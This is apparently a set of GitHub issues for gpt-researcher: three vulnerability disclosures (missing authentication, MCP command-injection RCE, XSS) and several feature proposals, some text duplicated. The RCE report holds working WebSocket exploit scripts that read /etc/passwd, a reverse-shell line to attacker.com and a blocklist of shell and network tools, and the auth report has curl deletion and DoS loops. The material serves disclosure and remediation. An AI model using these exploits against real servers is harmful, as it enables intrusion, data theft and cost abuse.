Configuration System — No Auth Toggle The configuration system (`gpt_researcher/config/config.py`, `gpt_researcher/config/variables/base.py`, `gpt_researcher/config/variables/default.py`) defines 50+ configuration variables. **None** relate to authentication: - No `AUTH_ENABLED`, `API_KEY`, `ACCESS_TOKEN`, or similar configuration fields - No conditional code paths that enable authentication based on environment variables - The `.env.example` file contains only external service API keys (OpenAI, Tavily) — no application-level auth configuration #### Documentation — No Security Warnings in Default Deployment **README.md** (the primary deployment guide): - Instructs users to run `pip install && python -m uvicorn main:app --reload` or `docker-compose up --build` - **Contains no security warnings** about the lack of authentication - **Does not mention** that the application is fully open to any network user - **Does not recommend** placing the application behind a reverse proxy with auth **Docker deployment** (`docker-compose.yml`, `Dockerfile`, `Dockerfile.fullstack`): - No authentication-related environment variables - `docker-compose.yml` explicitly sets `user: root`, compounding the risk - Ports are mapped directly to the host with no network isolation #### External Mitigation Mentioned in Non-Default Documentation The only authentication-related content exists in **two non-default deployment guides** that most users will never read: **1. `docs/docs/proposals/local-server-deployment-guide.md` (lines 529-553):** This is a "deployment planning proposal" document (not the main getting-started guide) that suggests Nginx Basic Auth as an optional external measure: ```nginx # Optional: Generate password file sudo htpasswd -c /etc/nginx/.htpasswd admin location / { auth_basic "Restricted Access"; auth_basic_user_file /etc/nginx/.htpasswd; } ``` **2. `docs/docs/gpt-researcher/getting-started/linux-deployment.md`:** Provides an Nginx reverse proxy configuration, but the sample config **contains no authentication directives** — it only proxies requests without any access control: ```nginx location ~ ^/(ws|upload|files|outputs|getConfig|setConfig) { proxy_pass http://localhost:8000; # No auth_basic or access control } ``` #### Why External Nginx Auth Is Not an Adequate Mitigation Even if a user manually configures Nginx Basic Auth (which is not part of the default deployment), this mitigation has significant limitations: | Limitation | Detail | |---|---| | **Not default** | Requires manual configuration by the user; the default deployment is fully open | | **Not documented in README** | The primary deployment guide (`README.md`) does not mention it | | **WebSocket bypass risk** | Nginx Basic Auth may not protect WebSocket upgrade requests in all configurations, depending on the `location` block ordering | | **No application-layer defense** | If the Nginx proxy is misconfigured, bypassed, or removed, the application has zero fallback authentication | | **No per-user isolation** | Basic Auth provides a single shared credential; all authenticated users share the same access level with no multi-tenancy | | **Not part of Docker deployment** | `docker-compose.yml` does not include Nginx with auth; users following the Docker quickstart get zero protection | ### Vulnerable Code **app.py — No authentication on any route:** ```python # Line 339 — File upload with no authentication @app.post("/upload/") async def upload_file(file: UploadFile = File(...)): return await handle_file_upload(file, DOC_PATH) # Line 344 — File deletion with no authentication @app.delete("/files/{filename}") async def delete_file(filename: str): return await handle_file_deletion(filename, DOC_PATH) # Line 311 — Research generation with no authentication (triggers LLM API costs) @app.post("/report/") async def generate_report(research_request: ResearchRequest, background_tasks: BackgroundTasks): ... # Line 324 — Directory listing with no authentication @app.get("/files/") async def list_files(): files = os.listdir(DOC_PATH) return {"files": files} ``` **server_utils.py — File deletion handler (lines 307-315):** ```python async def handle_file_deletion(filename: str, DOC_PATH: str) -> JSONResponse: file_path = os.path.join(DOC_PATH, os.path.basename(filename)) if os.path.exists(file_path): os.remove(file_path) # Deletes file without any authentication check return JSONResponse(content={"message": "File deleted successfully"}) else: return JSONResponse( content={"message": "File not found"}, status_code=404, ) ``` **WebSocket handler — No authentication on connection (server_utils.py, lines 327-393):** ```python async def handle_websocket_communication(websocket, manager): # No authentication check before accepting WebSocket connection while True: data = await websocket.receive_text() if data.strip().startswith("start"): # Triggers expensive research tasks without authentication running_task = run_long_running_task( handle_start_command(websocket, data, manager) ) ``` --- ## Impact 1. **Arbitrary File Deletion:** Any unauthenticated user can delete files from the server's document directory via `DELETE /files/{filename}`, causing data loss for all users. 2. **Data Exfiltration:** All research reports generated by any user are accessible via `GET /api/reports` and the static `/outputs/` mount, allowing complete data theft. 3. **Financial Impact:** Each `POST /report/` or WebSocket `start` command triggers multiple LLM API calls. An attacker can send hundreds of concurrent requests to generate massive API bills without any rate limiting or authentication. 4. **Denial of Service:** Unlimited concurrent research requests consume server CPU, memory, and network bandwidth, potentially making the service unavailable for legitimate users. 5. **Configuration Manipulation:** Via the WebSocket interface, an attacker can modify server-side environment variables (e.g., `RETRIEVER`, `MCP_STRATEGY`) affecting all subsequent requests from all users. --- ## Proof of Concept ### PoC 1: Unauthenticated File Listing ```bash $ curl -s http://localhost:8888/files/ {"files":["confidential_report.pdf","internal_data.csv"]} ``` ### PoC 2: Unauthenticated File Deletion ```bash # List files before deletion $ curl -s http://localhost:8888/files/ {"files":["important_doc.pdf","research_data.csv"]} # Delete a file without any authentication $ curl -s -X DELETE http://localhost:8888/files/important_doc.pdf {"message":"File deleted successfully"} # Verify deletion $ curl -s http://localhost:8888/files/ {"files":["research_data.csv"]} ``` ### PoC 3: Unauthenticated Report Access ```bash # List all research reports $ curl -s http://localhost:8888/api/reports {"reports":[{"id":"task_123","query":"sensitive topic","report":"...full report content..."}]} # Download report files directly $ curl -s -o stolen_report.docx http://localhost:8888/outputs/task_123_abc.docx ``` ### PoC 4: Unauthenticated DoS via Concurrent Research Tasks ```bash # Send 10 concurrent research requests — each triggers multiple LLM API calls for i in $(seq 1 10); do curl -s -X POST http://localhost:8888/report/ \ -H "Content-Type: application/json" \ -d '{"task":"expensive research '$i'","report_type":"research_report","report_source":"web","tone":"Objective","agent":"Auto Agent","repo_name":"","branch_name":""}' & done wait ``` **Result:** All 10 requests are accepted and processed concurrently, each consuming LLM API credits. ### Verified Results All PoCs were tested against a live gpt-researcher v3.4.3 instance running on `localhost:8888`: - `GET /files/` returned `{"files":["evil_test.py","webshell.py","xss.html"]}` — **confirmed unauthenticated access** - `DELETE /files/xss.html` returned `{"message":"File deleted successfully"}` — **confirmed unauthenticated deletion** - `POST /report/` accepted 5 concurrent requests, each returning a `research_id` — **confirmed no rate limiting** - `GET /outputs/task_1773884817_a0a058baae.docx` returned HTTP 200 — **confirmed unauthenticated report download** --- ## Remediation ### Recommended Fix: Implement API Key Authentication Middleware ```python import os from fastapi import Depends, HTTPException, Security from fastapi.security import APIKeyHeader API_KEY_HEADER = APIKeyHeader(name="X-API-Key", auto_error=False) async def verify_api_key(api_key: str = Security(API_KEY_HEADER)): expected_key = os.environ.get("GPTR_API_KEY") if not expected_key: raise HTTPException(status_code=500, detail="API key not configured") if not api_key or api_key != expected_key: raise HTTPException(status_code=403, detail="Invalid or missing API key") # Apply to all sensitive routes: @app.post("/upload/", dependencies=[Depends(verify_api_key)]) async def upload_file(file: UploadFile = File(...)): ... @app.delete("/files/{filename}", dependencies=[Depends(verify_api_key)]) async def delete_file(filename: str): ... @app.post("/report/", dependencies=[Depends(verify_api_key)]) async def generate_report(...): ... ``` ### Additional Recommendations 1. **WebSocket Authentication:** Require a valid token during the WebSocket handshake. 2. **Rate Limiting:** Implement request rate limiting using `slowapi` or similar middleware. 3. **Bind to Localhost:** Change the default binding from `0.0.0.0` to `127.0.0.1`. 4. **Remove Static Mount:** Remove the `/outputs/` static file mount; serve reports only through authenticated endpoints. 5. **Security Warning in README:** Add a prominent security warning to `README.md` informing users that the application has no built-in authentication and must be deployed behind an authenticated reverse proxy. 6. **Docker Compose Hardening:** Add an Nginx service with authentication enabled by default to `docker-compose.yml`, and remove the `user: root` directive. ### Existing Mitigations Assessment | Mitigation | Exists | Effectiveness | |---|---|---| | Application-level auth (API key, JWT, session) | **No** | N/A | | Auth toggle in `.env` or config | **No** | N/A | | Auth in default Docker deployment | **No** | N/A | | Security warning in README | **No** | N/A | | Nginx Basic Auth in proposal doc | **Yes (external, non-default)** | **Weak** — not part of default deployment; not mentioned in README; does not protect WebSocket in all configurations; provides no per-user isolation | | IP whitelist suggestion in proposal doc | **Yes (external, non-default)** | **Weak** — only applicable to fixed-IP deployments; not part of default deployment | | CORS origin restriction | **Yes (configurable)** | **Insufficient** — CORS only restricts browser-based cross-origin requests; does not prevent direct API access via curl, scripts, or non-browser clients | **Conclusion:** No effective built-in mitigation exists. The application is **insecure by design and by default**. The only documented mitigations are external Nginx configurations buried in a non-default deployment proposal document that most users will never encounter during standard installation. --- ## References - CWE-306: https://cwe.mitre.org/data/definitions/306.html - OWASP API Security Top 10 — API2:2023 Broken Authentication: https://owasp.org/API-Security/editions/2023/en/0xa2-broken-authentication/
title: Missing Authentication and Unrestricted Access to Critical Functions in gpt-researcher

body: ## Product Information - **Vendor:** assafelovic - **Product:** GPT Researcher - **Affected Version:** <= 3.4.3 - **Fixed Version:** N/A (unpatched) - **Repository:** https://github.com/assafelovic/gpt-researcher - **Component:** WebSocket `/ws` endpoint, MCP client subsystem - **Discoverer:** Yu Bao - **Date:** 2026-03-19 --- ## Vulnerability Summary GPT Researcher v3.4.3 and earlier versions are vulnerable to **unauthenticated Remote Code Execution (RCE)** via the WebSocket `/ws` endpoint. An attacker can send a WebSocket message containing a `mcp_configs` parameter with an arbitrary `command` and `args` array. These values are passed through the application without any validation or sanitization, ultimately reaching `anyio.open_process()` which spawns the attacker-specified process on the server. No authentication is required. The attacker has full control over the executed command, its arguments, and the environment variables of the spawned process. --- ## Vulnerability Details **CWE:** CWE-78 (Improper Neutralization of Special Elements used in an OS Command) **CVSS v3.1 Score:** 10.0 (Critical) **CVSS Vector:** CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H ### Root Cause The application accepts MCP (Model Context Protocol) server configurations via the unauthenticated WebSocket endpoint. These configurations include a `command` field and an `args` array that specify an executable to run as a subprocess. At no point in the entire call chain — from the WebSocket message parser through the MCP client manager to the actual process creation — is any validation, sanitization, or allowlisting performed on the command, arguments, or environment variables. ### Complete Vulnerable Data Flow ``` Attacker WebSocket Message │ mcp_configs: [{command: "bash", args: ["-c", "id > /tmp/pwned"]}] ▼ [1] extract_command_data() ← backend/server/server_utils.py:408-410 │ mcp_configs = json_data.get("mcp_configs", []) ← NO VALIDATION ▼ [2] handle_start_command() ← backend/server/server_utils.py:137-171 │ Passes mcp_configs to manager.start_streaming() ▼ [3] start_streaming() ← backend/server/websocket_manager.py:100-112 │ Passes mcp_configs to run_agent() ▼ [4] run_agent() ← backend/server/websocket_manager.py:115-188 │ Sets os.environ["MCP_STRATEGY"] from user input (line 128) │ Creates GPTResearcher(mcp_configs=mcp_configs) (line 161) ▼ [5] GPTResearcher.__init__() ← gpt_researcher/agent.py:79,171 │ self.mcp_configs = mcp_configs (NO VALIDATION) │ self._process_mcp_configs(mcp_configs) ▼ [6] MCPClientManager.__init__() ← gpt_researcher/mcp/client.py │ convert_configs_to_langchain_format() ▼ [7] convert_configs_to_langchain_format() ← gpt_researcher/mcp/client.py:82-95 │ server_config["command"] = config["command"] ← ATTACKER CONTROLLED │ server_config["args"] = config.get("args", []) ← ATTACKER CONTROLLED │ server_config["env"] = config.get("env", {}) ← ATTACKER CONTROLLED ▼ [8] MultiServerMCPClient(server_configs) ← langchain-mcp-adapters library │ Creates StdioServerParameters(command=..., args=..., env=...) ▼ [9] stdio_client() ← mcp/client/stdio.py │ anyio.open_process([command, *args], env=env) ← COMMAND EXECUTION ▼ [10] Operating System Process Spawned ↓ Attacker's command runs as the server process user ``` ### Vulnerable Code Snippets **Entry — `backend/server/server_utils.py:408-410`:** ```python def extract_command_data(json_data): return ( ... json_data.get("mcp_enabled", False), # User-controlled json_data.get("mcp_strategy", "fast"), # User-controlled json_data.get("mcp_configs", []), # User-controlled — NO VALIDATION ) ``` **MCP Config Processing — `gpt_researcher/mcp/client.py:82-95`:** ```python # Handle stdio transport configuration if server_config.get("transport") == "stdio": if config.get("command"): server_config["command"] = config["command"] # ATTACKER CONTROLLED server_args = config.get("args", []) # ATTACKER CONTROLLED server_config["args"] = server_args server_env = config.get("env", {}) # ATTACKER CONTROLLED if server_env: server_config["env"] = server_env ``` **Process Execution — `mcp/client/stdio.py:248-255` (MCP library):** ```python process = await anyio.open_process( [command, *args], # Attacker's command and arguments env=env, # Attacker's environment variables stderr=errlog, cwd=cwd, start_new_session=True, ) ``` --- ## Impact 1. **Full Remote Code Execution:** The attacker can execute arbitrary commands on the server with the privileges of the application process. This includes reading/writing files, installing backdoors, pivoting to other systems, and exfiltrating data. 2. **No Authentication Required:** The WebSocket endpoint has zero authentication. Any network client can connect and send the exploit payload. 3. **Environment Variable Control:** The attacker controls the `env` parameter of the spawned process, enabling further attacks such as `LD_PRELOAD` injection, `PATH` hijacking, or credential injection. 4. **Cross-Site Exploitable:** Combined with the Cross-Site WebSocket Hijacking vulnerability (no Origin validation), this RCE can be triggered from a malicious web page visited by a user on the same network as the gpt-researcher instance. --- ## Proof of Concept ### Prerequisites A running instance of gpt-researcher v3.4.3 accessible at `http://target:8888`. ### PoC 1: Create a File on the Server (Minimal PoC) ```python import asyncio import websockets import json async def rce_poc(): async with websockets.connect('ws://target:8888/ws') as ws: payload = json.dumps({ 'task': 'test', 'report_type': 'research_report', 'report_source': 'web', 'source_urls': [], 'tone': 'Objective', 'agent': 'Auto Agent', 'repo_name': '', 'branch_name': '', 'mcp_enabled': True, 'mcp_strategy': 'fast', 'mcp_configs': [{ 'name': 'exploit', 'command': 'touch', 'args': ['/tmp/rce_proof_gpt_researcher'] }] }) await ws.send('start ' + payload) for i in range(10): try: msg = await asyncio.wait_for(ws.recv(), timeout=15) except: break asyncio.run(rce_poc()) ``` **Verification:** ```bash $ ls -la /tmp/rce_proof_gpt_researcher -rw-r--r-- 1 xxx wheel 0 Mar 19 11:10 /tmp/rce_proof_gpt_researcher ``` File created on the server — **RCE confirmed.** ### PoC 2: Execute System Commands and Exfiltrate Output ```python import asyncio import websockets import json async def rce_exfil(): async with websockets.connect('ws://target:8888/ws') as ws: payload = json.dumps({ 'task': 'test', 'report_type': 'research_report', 'report_source': 'web', 'source_urls': [], 'tone': 'Objective', 'agent': 'Auto Agent', 'repo_name': '', 'branch_name': '', 'mcp_enabled': True, 'mcp_strategy': 'fast', 'mcp_configs': [{ 'name': 'rce', 'command': 'bash', 'args': ['-c', 'id > /tmp/rce_output && whoami >> /tmp/rce_output && hostname >> /tmp/rce_output && cat /etc/passwd | head -3 >> /tmp/rce_output'] }] }) await ws.send('start ' + payload) for i in range(10): try: await asyncio.wait_for(ws.recv(), timeout=15) except: break asyncio.run(rce_exfil()) ``` **Verified Output:** ```bash $ cat /tmp/rce_output uid=502(xxx) gid=20(staff) groups=20(staff),12(everyone),61(localaccounts),701(com.apple.sharepoint.group.1),702(com.apple.sharepoint.group.2),100(_lpoperator) xxx LM-SXX-xxxxxx66 ## # User Database # ``` The server executed `id`, `whoami`, `hostname`, and `cat /etc/passwd` — all output captured. **Full RCE with data exfiltration confirmed.** ### PoC 3: Reverse Shell (Conceptual — Not Executed) ```json { "mcp_configs": [{ "name": "shell", "command": "bash", "args": ["-c", "bash -i >& /dev/tcp/attacker.com/4444 0>&1"] }] } ``` This payload would establish a reverse shell connection to `attacker.com:4444`, giving the attacker an interactive shell on the server. --- ## Remediation ### Recommended Fix: Allowlist MCP Commands ```python # gpt_researcher/mcp/client.py ALLOWED_MCP_COMMANDS = { 'npx': True, 'uvx': True, 'node': True, 'python': True, 'python3': True, } BLOCKED_COMMANDS = { 'bash', 'sh', 'zsh', 'cmd', 'powershell', 'pwsh', 'curl', 'wget', 'nc', 'ncat', 'socat', 'rm', 'dd', 'mkfs', 'kill', 'chmod', 'chown', } def validate_mcp_command(config: dict) -> bool: """Validate MCP server command against allowlist.""" command = config.get("command", "") # Block dangerous commands base_command = os.path.basename(command) if base_command in BLOCKED_COMMANDS: raise ValueError(f"MCP command '{command}' is blocked for security reasons") # Only allow known MCP server launchers if base_command not in ALLOWED_MCP_COMMANDS: raise ValueError( f"MCP command '{command}' is not in the allowed list. " f"Allowed commands: {', '.join(ALLOWED_MCP_COMMANDS.keys())}" ) # Validate args don't contain shell metacharacters args = config.get("args", []) for arg in args: if any(c in str(arg) for c in ['|', '&', ';', '`', '$', '>', '<']): raise ValueError(f"MCP argument contains shell metacharacters: {arg}") return True # Apply validation before processing configs: def convert_configs_to_langchain_format(self, configs): for config in configs: validate_mcp_command(config) # Validate BEFORE processing ... ``` ### Additional Recommendations 1. **Require Authentication:** Add authentication to the WebSocket endpoint to prevent anonymous access. 2. **Disable MCP by Default:** MCP should be opt-in and require explicit server-side configuration, not accept arbitrary configs from clients. 3. **Sandbox MCP Processes:** Run MCP server processes in a sandboxed environment (e.g., Docker container, seccomp, AppArmor). 4. **Remove `env` Control:** Do not allow clients to specify environment variables for MCP processes. --- ## References - CWE-78: https://cwe.mitre.org/data/definitions/78.html - OWASP Command Injection: https://owasp.org/www-community/attacks/Command_Injection - MCP Protocol: https://modelcontextprotocol.io/
title: Unauthenticated Remote Code Execution via MCP Command Injection in gpt-researcher
Stored Cross-Site Scripting (XSS) via Unauthenticated Report API in gpt-researcher

body: ## Product Information - **Vendor:** assafelovic - **Product:** GPT Researcher - **Affected Version:** <= 3.4.3 - **Fixed Version:** N/A (unpatched) - **Repository:** https://github.com/assafelovic/gpt-researcher - **Component:** `backend/server/server_utils.py`, `frontend/scripts.js` - **Discoverer:** Yu Bao - **Date:** 2026-03-19 --- ## Vulnerability Summary GPT Researcher v3.4.3 and earlier versions are vulnerable to Reflected Cross-Site Scripting (XSS) via the research task name. When a user submits a research query containing HTML/JavaScript through the WebSocket interface, the backend includes the unsanitized task name in multiple WebSocket `logs` response messages. The lightweight frontend renders these log messages using `innerHTML` without any sanitization, causing the injected script to execute in the user's browser. No authentication is required to trigger this vulnerability. --- ## Vulnerability Details **CWE:** CWE-79 (Improper Neutralization of Input During Web Page Generation) **CVSS v3.1 Score:** 6.1 (Medium) **CVSS Vector:** CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N ### Root Cause The backend embeds the user-supplied `task` string directly into WebSocket log message outputs without HTML encoding. The lightweight frontend receives these messages and renders them via `innerHTML`, creating a reflected XSS vulnerability. ### Vulnerable Code — Backend (Log Message Generation) The backend includes the raw task name in multiple log messages throughout the research pipeline: **`gpt_researcher/actions/utils.py` and `gpt_researcher/skills/researcher.py` — Log messages containing raw task:** ```python # Multiple locations generate log messages like: await stream_output("logs", "starting_research", f"🔍 Starting the research task for '{task}'...", websocket) await stream_output("logs", "planning_research", f"🌐 Browsing the web to learn more about the task: {task}...", websocket) ``` The `task` variable contains the user's raw input with no HTML encoding applied. ### Vulnerable Code — Frontend (Unsafe Rendering) **`frontend/scripts.js:1042-1046` — `addAgentResponse()`:** ```javascript const addAgentResponse = (data) => { const output = document.getElementById('output'); const responseDiv = document.createElement('div'); responseDiv.className = 'agent_response'; responseDiv.innerHTML = data.output; // ← XSS SINK: raw HTML from server rendered directly output.appendChild(responseDiv); }; ``` **`frontend/scripts.js:870-874` — WebSocket message handler:** ```javascript if (data.type === 'logs') { if (data.content === 'subqueries' && data.metadata && Array.isArray(data.metadata)) { displaySubQuestions(data.metadata) } addAgentResponse(data) // Every logs message rendered via innerHTML } ``` ### Complete Data Flow ``` 1. User enters task: 2. WebSocket sends: start {"task":"", ...} 3. Backend generates log messages containing raw task name: {"type":"logs","output":"🔍 Starting the research task for ''..."} 4. Frontend receives WebSocket message: scripts.js:862 → data = JSON.parse(event.data) scripts.js:870 → if (data.type === 'logs') scripts.js:874 → addAgentResponse(data) 5. addAgentResponse renders via innerHTML: scripts.js:1046 → responseDiv.innerHTML = data.output 6. Browser parses , src=x fails, onerror fires → alert() executes ``` --- ## Impact 1. **Self-XSS to Social Engineering:** An attacker can instruct a victim to paste a specific "research query" containing a JavaScript payload. The XSS executes immediately when the research starts. 2. **Session Hijacking:** The injected JavaScript runs in the context of the application's origin, with access to cookies, localStorage, and the DOM. 3. **Multiple Injection Points:** A single malicious task name triggers XSS through at least 4 separate log messages during one research session, each executing independently: - `starting_research`: "Starting the research task for '...'" - `mcp_retrieval_stage1`: "Selecting optimal MCP tools for: ..." - `mcp_no_results`: "No relevant information found via MCP for: ..." - `planning_research`: "Browsing the web to learn more about the task: ..." --- ## Proof of Concept ### Prerequisites A running instance of gpt-researcher v3.4.3 with the lightweight frontend at `http://localhost:8888`. ### Method 1: Direct Browser Input Open `http://localhost:8888`, enter the following in the search box, and click "Research": ``` ``` The XSS fires immediately as the first log message is rendered. ### Verified Results Tested against a live gpt-researcher v3.4.3 instance on `localhost:8888`. **WebSocket responses containing unsanitized HTML (verbatim from server):** ``` [XSS IN LOGS] content=starting_research output: 🔍 Starting the research task for ''... [XSS IN LOGS] content=mcp_retrieval_stage1 output: 🧠 Stage 1: Selecting optimal MCP tools for: [XSS IN LOGS] content=mcp_no_results output: ℹ️ No relevant information found via MCP for: [XSS IN LOGS] content=planning_research output: 🌐 Browsing the web to learn more about the task: ... ``` **All 4 messages flow to `addAgentResponse()` → `responseDiv.innerHTML = data.output` → XSS executes.** **Browser alert popup confirmed** on `localhost:8888` with `alert(document.domain)` showing "localhost". --- ## Remediation ### Fix: HTML-Escape Log Output Before innerHTML **`frontend/scripts.js` — Sanitize in `addAgentResponse()`:** ```javascript const addAgentResponse = (data) => { const output = document.getElementById('output'); const responseDiv = document.createElement('div'); responseDiv.className = 'agent_response'; responseDiv.textContent = data.output; // Use textContent instead of innerHTML output.appendChild(responseDiv); }; ``` Or if HTML formatting is needed in log messages: ```javascript const addAgentResponse = (data) => { const output = document.getElementById('output'); const responseDiv = document.createElement('div'); responseDiv.className = 'agent_response'; responseDiv.innerHTML = DOMPurify.sanitize(data.output); // Sanitize with DOMPurify output.appendChild(responseDiv); }; ``` ### Backend Fix: HTML-encode task name in log messages ```python import html await stream_output("logs", "starting_research", f"🔍 Starting the research task for '{html.escape(task)}'...", websocket) ``` --- ## References - CWE-79: https://cwe.mitre.org/data/definitions/79.html - OWASP XSS Prevention: https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Scripting_Prevention_Cheat_Sheet.html
title: Reflected Cross-Site Scripting (XSS) via Task Name in gpt-researcher

body:
## The Problem

In order to improve research quality of the GPT-researcher, there need to be a way to properly measure research quality. Although there are existing evaluation modules in this project, they are misaligned with the goals on research quality (comprehensive, unbiased, and factual), thus cannot provide much guidance for research quality improvements.

## The proposal

Replacing existing evaluation implementations with [DeepResearchGym evaluation protocol](https://github.com/cxcscmu/deepresearch_benchmarking). 

And use [Researchy Questions](https://huggingface.co/datasets/corbyrosset/researchy_questions), [DeepResearch Bench](https://github.com/Ayanami0730/deep_research_bench), and [ServiceNow DRBench](https://huggingface.co/datasets/ServiceNow/drbench) as the baseline to evaluate research quality.

## Potential Future Projects

Quality optimization would be enabled once the improved evaluation is setup. Some ideas:
- Use GEPA + FewshotsBootstrap (from DSPy) to optimize prompts 
- Support community curated datasets for targeted optimization
- Add feature for user to optimize their GTPR instance with their own data

## Appendix: misalignment of existing eval modules

SimpleQAEval is judging whether the research outcome contains the exact answer of a specific, close-ended question. But the point of research is not to find answer to a closed-ended question, but more about factual, unbiased and comprehensive exploration of information. 

Existing hallucination eval checks hallucination solely based on the research query and the generated report, because the LLM judge lacks access to the underlying ground truth data, the evaluation result can not really reflect the potential bias/truthfulness of the research outcome.
title: Implement DeepResearchGym-style evaluations

body:
## Summary

Research agents accessing external APIs and data sources need verifiable identity for trust and attribution. AgentID provides cryptographic identity per agent.

## Reference Implementation

[AgentID](https://getagentid.dev) is an open-source identity layer for AI agents:
- ECDSA P-256 certificates per agent
- Verification API for runtime credential validation
- Trust scores for authorization decisions
- Agent registry for discovery

We have built integrations for CrewAI, LangChain, and MCP.

Source: [github.com/haroldmalikfrimpong-ops/getagentid](https://github.com/haroldmalikfrimpong-ops/getagentid)

Happy to contribute an implementation.
title: Feature: AgentID for verifiable researcher agent identity

title: Proposal: Research Agent Discovery Pipeline via WheatCoin Community

body:
## Problem

GPT-Researcher's web retrieval fails silently on Cloudflare-protected sites (major news outlets, LinkedIn, Amazon, government sites). The scraper gets a 403 or returns empty content without the research loop knowing.

## Proposed integration

[anybrowse](https://anybrowse.dev) is an MCP-native web scraper with Cloudflare bypass via residential Chrome. It fits naturally into the GPT-Researcher retrieval chain as a fallback scraper when standard HTTP fails.

It exposes a `scrape` tool that returns clean LLM-ready markdown -- the exact format GPT-Researcher needs for its context window.

## Quick test

Add as an MCP server:

```json
{
  "mcpServers": {
    "anybrowse": {
      "type": "streamable-http",
      "url": "https://anybrowse.dev/mcp"
    }
  }
}
```

Then: "Research the latest AI regulation news from EU government sites" -- anybrowse handles the Cloudflare-protected `.europa.eu` domains that standard scrapers bounce off.

## Details

- Free tier: 10 scrapes/day, no API key
- Paid: $5 for 3,000 credits (never expire)
- MCP tools: `scrape`, `crawl`, `batch_scrape`, `extract`, `search`

body:
## Problem

GPT-Researcher's web retrieval fails silently on Cloudflare-protected sites (major news outlets, LinkedIn, Amazon, government sites). The scraper gets a 403 or returns empty content without the research loop knowing.

## Proposed integration

[anybrowse](https://anybrowse.dev) is an MCP-native web scraper with Cloudflare bypass via residential Chrome. It fits naturally into the GPT-Researcher retrieval chain as a fallback scraper when standard HTTP fails.

It exposes a `scrape` tool that returns clean LLM-ready markdown -- the exact format GPT-Researcher needs for its context window.

## Quick test

Add as an MCP server:

```json
{
  "mcpServers": {
    "anybrowse": {
      "type": "streamable-http",
      "url": "https://anybrowse.dev/mcp"
    }
  }
}
```

Then: "Research the latest AI regulation news from EU government sites" -- anybrowse handles the Cloudflare-protected `.europa.eu` domains that standard scrapers bounce off.

## Details

- Free tier: 10 scrapes/day, no API key
- Paid: $5 for 3,000 credits (never expire)
- MCP tools: `scrape`, `crawl`, `batch_scrape`, `extract`, `search`
- Docs: https://anybrowse.dev/docs

Would be happy to contribute a retriever class if this seems like a good fit for the project.
title: Feature request: anybrowse MCP integration for Cloudflare-protected scraping
